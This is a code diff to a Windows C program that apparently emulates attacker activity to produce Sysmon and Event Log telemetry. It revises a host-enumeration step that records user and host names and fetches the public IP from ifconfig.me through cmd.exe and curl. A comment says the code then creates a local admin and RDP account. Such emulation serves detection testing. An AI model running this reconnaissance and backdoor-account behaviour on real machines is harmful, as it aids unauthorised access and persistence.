@@ -233,6 +233,7 @@ static void create_task_orion(void) {
    "noise" the scenario wants in Sysmon/Event Log. Best-effort throughout:
    a failed step is logged + skipped, never aborts the rest. */
 static void enumerate_host(void) {
+    HRESULT hr;
     char userBuf[256];  DWORD userLen = sizeof(userBuf);
     char hostBuf[256];  DWORD hostLen = sizeof(hostBuf);
     char ipBuf[64];     ipBuf[0] = 0;
@@ -251,28 +252,28 @@ static void enumerate_host(void) {
         audit("[+] Enumerate: host=%s", hostBuf);
     }
 
-    /* Public IP: download body of ifconfig.me to a temp file, read first line,
-       delete it. URLDownloadToFileA is already the codebase's fetch pattern. */
-    char ipFile[MAX_PATH], ipTemp[MAX_PATH];
+    /* Public IP via curl --max-time 5 wrapped in cmd.exe /c (bounded by
+       run_exe's WaitForSingleObject ceiling). URLDownloadToFileA had no
+       timeout and was hanging the worker when ifconfig.me was unreachable. */
+    char ipFile[MAX_PATH];
     wsprintfA(ipFile, "%s\\ip.txt", g_dir);
     DeleteFileA(ipFile);
-    HRESULT hr = URLDownloadToFileA(NULL, "https://ifconfig.me", ipFile, 0, NULL);
-    if (hr == S_OK) {
-        FILE *f = fopen(ipFile, "r");
-        if (f) {
-            if (fgets(ipBuf, sizeof(ipBuf), f)) {
-                /* trim trailing newline */
-                char *nl = strchr(ipBuf, '\n'); if (nl) *nl = 0;
-                char *cr = strchr(ipBuf, '\r'); if (cr) *cr = 0;
-                audit("[+] Enumerate: public IP=%s", ipBuf);
-            }
-            fclose(f);
+    char curlCmd[MAX_PATH * 4];
+    wsprintfA(curlCmd, "cmd.exe /c curl.exe -s --max-time 5 https://ifconfig.me > \"%s\"", ipFile);
+    int irc = run_exe(curlCmd, 10000);
+    FILE *f = fopen(ipFile, "r");
+    if (f) {
+        if (fgets(ipBuf, sizeof(ipBuf), f)) {
+            char *nl = strchr(ipBuf, '\n'); if (nl) *nl = 0;
+            char *cr = strchr(ipBuf, '\r'); if (cr) *cr = 0;
+            audit("[+] Enumerate: public IP=%s", ipBuf);
         }
+        fclose(f);
         DeleteFileA(ipFile);
     }
     if (!ipBuf[0]) {
         lstrcpynA(ipBuf, "unreachable", sizeof(ipBuf));
-        audit("[-] Public IP fetch failed (0x%lx)", hr);
+        audit("[-] Public IP fetch failed (curl rc=%d)", irc);
     }
 
     /* Create the local admin + RDP account via net.exe wrapped in cmd.exe /c
